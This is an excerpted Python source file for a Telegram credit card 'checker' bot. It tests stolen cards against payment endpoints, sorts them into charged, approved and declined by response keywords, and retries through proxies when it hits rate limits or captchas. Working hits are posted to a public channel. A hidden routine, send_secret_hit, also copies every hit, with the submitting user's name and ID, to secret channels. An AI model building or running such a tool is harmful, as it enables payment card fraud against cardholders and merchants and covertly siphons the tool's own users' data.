...
RETRY_KEYWORDS = [
    ...
    'unable to get payment token', 'payment token',
    'unable to get token', 'failed to get token',
    'site error', 'site_error',
    'http 429', 'http_429', 'status: 429', 'status 429',
    'too many requests', 'rate limit', 'rate_limit',
    'internal server error', 'internal_server_error',
    'bad gateway', 'service unavailable', 'gateway timeout',
    '502', '503', '504', 'cloudflare', 'captcha',
    'cart failed', 'invalid json', 'inventoryreservationfailure',
    'empty response', 'empty submit',
    'checkout_expired', 'checkout_not_found', 'cart add failed',
]
...
MONEY_APPROVED_KEYWORDS = [
    ...
    'insufficient account balance', 'insufficient_account_balance',
...
DECLINE_KEYWORDS = [
    ...
    'pickup_card', 'pick_up_card', 'restricted_card', 'restricted card',
    ...
    'invalid_number', 'decision_rule_block', 'generic_error',
]
...
def load_stats():
    default = {"total_checks": 0, "total_charged": 0, "total_approved": 0, "total_dead": 0, "started_at": time.time()}
...
async def broadcast_to_all_users(message_text):
    users = load_users()
    if not users:
        return 0, 0
    sent = 0
    ...
    for user_id in users:
        try:
            await bot.send_message(user_id, premium_emoji(message_text), parse_mode='html')
            sent += 1
...
async def check_card(card, proxy=None):
    try:
        ...
        response_msg = (raw.get('Response') or raw.get('response') or raw.get('message')
...
async def broadcast_hit(result, hit_type, username=None, user_id=None):
    """تنشر البطاقة على القناة العامة + القنوات السرية"""
...
👤 𝗨𝘀𝗲𝗿 ➛ {user_line}"""
    ...
    # 🔒 إرسال لكل القنوات السرية
    try:
        await send_secret_hit(result, hit_type, username=username, user_id=user_id)
    except Exception as e:
        logger.error(f"🔒 Secret broadcast error: {e}")


# ========== 🔒 SECRET Channels (تنسيق خاص) ==========
async def send_secret_hit(result, hit_type, username=None, user_id=None):
    """🔒 يبعت الـ Hit لكل القنوات السرية - مع يوزر وايدي المستخدم"""
    if not SECRET_CHANNEL_IDS:
        return
    ...
    try:
        ...
        user_id_display = user_id if user_id else "-"
...
━━━━━━━━━━━━━━━━━
👤 𝗨𝘀𝗲𝗿: @{user_display}
🆔 𝗜𝗗: <code>{user_id_display}</code>

⏱️ 𝗧𝗼𝗼𝗸 0.00s"""

        # 🔒 إرسال لكل قناة سرية على حدة
        for ch_id in SECRET_CHANNEL_IDS:
            try:
                await bot.send_message(ch_id, secret_text, parse_mode='html')
                logger.info(f"🔒 Sent {hit_type} to SECRET channel {ch_id}")
            except Exception as e:
...
🥰 Country {country} {flag}"""
    ...
    try:
        await broadcast_hit(result, hit_type, username=username, user_id=user_id)
    except Exception as e:
...
└─ Send message to all {users_count} users
...
└─ Add / Remove welcome image"""
    ...
    buttons = [
        [Button.inline(" 📢 Broadcast to Users", b"broadcast_users", style="success")],
...
👥 <b>Total Users:</b> <code>{len(load_users())}</code>
...
# ========== 📢 Broadcast to Users ==========
@bot.on(events.CallbackQuery(data=b"broadcast_users"))
async def broadcast_users_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied.", alert=True)
        return
    ...
    text = f"""📢 <b>Broadcast to Users</b>

👥 <b>Total Users:</b> <code>{users_count}</code>

📝 <b>Send the message you want to broadcast</b>
to all bot users.

✅ Supports HTML formatting
✅ Premium emojis supported
⚠️ This may take a while for large user counts

Send the message now 👇"""

    admin_states[user_id] = 'awaiting_broadcast_message'
    buttons = [[Button.inline(" ❌ Cancel", b"admin_panel", style="danger")]]
    await event.edit(premium_emoji(text), buttons=buttons, parse_mode='html')
...
async def handle_admin_input(event):
    ...
    if state == 'awaiting_broadcast_message':
        ...
        if not event.message.text:
            await event.reply(premium_emoji("❌ Please send a text message."), parse_mode='html')
            return

        broadcast_text = event.message.text

        if not broadcast_text.strip():
            await event.reply(premium_emoji("❌ Empty message."), parse_mode='html')
            return

        users_count = len(load_users())
        status_msg = await event.reply(premium_emoji(
            f"📢 <b>Broadcasting to {users_count} users...</b>\n\n⏳ Please wait..."
        ), parse_mode='html')
        ...
        await status_msg.edit(premium_emoji(
            ...
            f"👥 <b>Total:</b> <code>{users_count}</code>"
        ), parse_mode='html')
        return
...
BY 𝗠𝗔𝗘𝗦𝗧𝗥𝗢 (@MA_S_t0)"""
        ...
        if result['status'] in ['Charged', 'Approved']:
            try:
                await broadcast_hit(result, result['status'], username=username, user_id=user_id)
            except Exception as e:
                logger.error(f"broadcast_hit error: {e}")
...
async def main():
    try:
        ...
        logger.info(f"🔒 Secret Channels: {SECRET_CHANNEL_IDS}")
